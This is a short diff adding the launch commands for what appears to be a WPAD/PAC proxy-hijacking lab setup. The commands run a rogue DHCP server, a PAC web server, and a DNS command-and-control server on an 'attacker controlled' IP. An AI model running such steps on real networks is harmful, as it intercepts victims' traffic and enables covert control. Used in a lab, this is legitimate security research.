@@ -1,0 +1,5 @@
+# Assuming WPAD-enabled Machine on Interface `vmnet2'
+./usr/local/sbin/dhcpd -d vmnet2
+./pac_websrv.py 80
+# Assume attacker controlled machine IP is 192.168.150.1
+./dns_cnc_srv.py -wsrv 192.168.150.1
